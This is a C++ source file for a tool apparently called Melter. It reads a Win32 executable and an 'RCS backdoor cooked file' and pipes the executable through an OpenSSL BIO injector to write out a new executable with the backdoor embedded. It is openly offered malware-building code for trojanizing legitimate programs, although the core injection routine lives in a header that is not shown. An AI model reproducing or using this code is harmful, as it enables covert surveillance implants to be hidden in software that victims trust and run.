#include <iomanip>
#include <iostream>
#include <string>
using namespace std;

#include <boost/program_options.hpp>
namespace po = boost::program_options;

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/evp.h>

#include "../MelterConfig.h"
#include "../include/melt.h"

#define READ_BUFF_SIZE  256

int main(int argc, char* argv[])
{
	po::options_description desc("Usage");
	desc.add_options()
			("help", "this help message")
			("input,I", po::value< string >(), "input file (must be a Win32 PE executable)")
			("output,O", po::value< string >()->default_value("output.exe"), "output file")
			("rcs,R", po::value< string >(), "RCS backdoor cooked file")
	;
	
	po::variables_map vm;
	try {
		po::store(po::parse_command_line(argc, argv, desc), vm);
		po::notify(vm);
	} catch (std::exception& e) {
		cout << "Invalid parameter: " << e.what() << endl;
		return 1;
	}
	
	if (vm.count("help")) {
		// cout << "Melter version " << Melter_VERSION_MAJOR << "." << Melter_VERSION_MINOR << endl;
		cout << desc << endl;
		return 1;
	}
	
	bf::path input_path;
	if (vm.count("input")) {
		try {
			input_path = vm["input"].as< string >();
		} catch (std::exception& e) {
			cout << "Invalid parameter: " << e.what() << endl;
			return 1;
		}
	} else {
		cout << "No input file provided." << endl;
		return 1;
	}

	bf::path output_path;
	if (vm.count("output")) {
		try {
		output_path = vm["output"].as< string >();
		} catch (std::exception& e) {
			cout << "Invalid parameter: " << e.what() << endl;
			return 1;
		}
	}

	bf::path rcs_path;
	if (vm.count("rcs")) {
		try {
			rcs_path = vm["rcs"].as< string >();
		} catch (std::exception& e) {
			cout << "Invalid parameter: " << e.what() << endl;
			return 1;
		}
	} else {
		cout << "No RCS backdoor selected." << endl;
		return 1;
	}

	cout << "Input file   : " << setw(32) << right << input_path << endl;
	cout << "Output file  : " << setw(32) << right << output_path << endl;
	cout << "RCS backdoor : " << setw(32) << right << rcs_path << endl;

	if ( ! bf::exists(input_path) || bf::is_directory(input_path)) {
		cout << input_path << " does not exists or is a directory." << endl;
		return 1;
	}

	if ( ! bf::exists(rcs_path) || bf::is_directory(rcs_path)) {
		cout << rcs_path << " does not exists or is a directory." << endl;
		return 1;
	}

	BIO* sbio = BIO_new_file(input_path.string().c_str(), "rb");
	BIO* output_bio = BIO_new_file(output_path.string().c_str(), "wb");

	BIO* bio_inject = BIO_new_injector(rcs_path.string().c_str());
	//BIO_set_backdoor(bio_inject, rcs_path.string().c_str());

	// cout << "Final size of executable: " << dec << BIO_get_size(bio_inject, bf::file_size(input_path)) << endl;

	BIO_push(bio_inject, output_bio);

	BIO* cbio = bio_inject;

	int len;
	char data[READ_BUFF_SIZE];
	if (sbio && cbio) {
	  /*
	   * read the data from the server and write them to the client.
	   * the correct sbio and cbio were set right above.
	   */
		for (;;) {
			if (BIO_eof(sbio) || BIO_eof(cbio))
				break;

			len = BIO_read(sbio, data, READ_BUFF_SIZE);
	        if (len < 0) {
	        	cout << "BIO_read: " << ERR_error_string(ERR_get_error(), NULL) << endl;
	        	break;
	        }

	        len = BIO_write(cbio, data, len);
	        if (len < 0) {
	        	cout << "BIO_write: " << ERR_error_string(ERR_get_error(), NULL) << endl;
	            break;
	        }
		}

		(void) BIO_flush(cbio);
	}

	BIO_free(bio_inject);

	return 0;
}
